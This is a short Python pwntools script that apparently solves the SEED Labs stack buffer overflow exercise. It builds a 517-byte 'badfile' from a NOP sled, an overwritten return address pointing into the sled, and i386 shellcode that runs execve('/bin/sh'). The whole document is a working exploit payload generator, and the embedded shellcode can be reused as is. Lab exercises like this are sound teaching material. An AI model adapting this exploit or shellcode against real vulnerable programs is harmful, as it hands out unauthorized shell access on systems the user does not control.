#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'

# Shellcode - execve /bin/sh
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# From get_addr: buffer at 0xffffcce8
buffer_addr = 0xffffcce8

# Offset is 36 bytes
offset = 36

# Build payload: fill buffer, then overwrite return address
# Put shellcode AFTER the return address (in the str[] array)
payload = b'\x90' * offset  # Fill buffer with NOPs

# Return address - point just after itself, into more NOPs
ret_addr = buffer_addr + offset + 4 + 50  # Skip ret addr, jump into NOPs

payload += p32(ret_addr)
payload += b'\x90' * 100  # More NOPs
payload += shellcode
payload += b'A' * (517 - len(payload))

print(f"[+] Buffer: {hex(buffer_addr)}")
print(f"[+] Return: {hex(ret_addr)}")

with open('../vulnerable-programs/seedlabs-stack/badfile', 'wb') as f:
    f.write(payload)

print("[+] Run: ./stack")
